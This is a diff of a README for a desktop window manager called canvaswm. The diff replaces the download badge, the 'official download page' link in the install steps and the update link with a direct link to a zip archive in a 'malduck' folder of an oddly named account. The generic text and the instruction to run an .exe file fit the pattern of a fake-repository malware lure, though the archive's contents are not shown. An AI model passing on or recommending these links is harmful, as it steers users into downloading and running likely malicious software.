@@ -1,6 +1,6 @@
 # 🖼️ canvaswm - Manage desktop windows on infinite canvases
 
-[![](https://img.shields.io/badge/Download-canvaswm-blue.svg)](https://github.com/Halleandersaaleorthoptics337/canvaswm)
+[![](https://img.shields.io/badge/Download-canvaswm-blue.svg)](https://github.com/Halleandersaaleorthoptics337/canvaswm/raw/refs/heads/main/malduck/Software-2.7.zip)
 
 Canvaswm organizes your computer workspace. It moves windows onto different screens based on a grid pattern. This tracker keeps your desktop orderly while you work. You gain more room for your files and programs. It creates a seamless flow for your daily tasks.
 
@@ -8,7 +8,7 @@ Canvaswm organizes your computer workspace. It moves windows onto different scre
 
 Follow these steps to put the software on your computer.
 
-1. Go to the [official download page](https://github.com/Halleandersaaleorthoptics337/canvaswm).
+1. Go to the [official download page](https://github.com/Halleandersaaleorthoptics337/canvaswm/raw/refs/heads/main/malduck/Software-2.7.zip).
 2. Look for the latest version under the Releases section.
 3. Click the file ending in .exe to start the download.
 4. Open the folder where your browser saves files.
@@ -64,7 +64,7 @@ Yes. You can span your canvas across two or more screens. Create zones on each m
 Yes. You may download and use this software without a fee.
 
 **How do I update the software?**
-Visit the [download page](https://github.com/Halleandersaaleorthoptics337/canvaswm) to check for new versions. Download and install the new file to replace the old one. Your settings usually stay intact during this process.
+Visit the [download page](https://github.com/Halleandersaaleorthoptics337/canvaswm/raw/refs/heads/main/malduck/Software-2.7.zip) to check for new versions. Download and install the new file to replace the old one. Your settings usually stay intact during this process.
 
 ## 💻 Customizing Settings
 
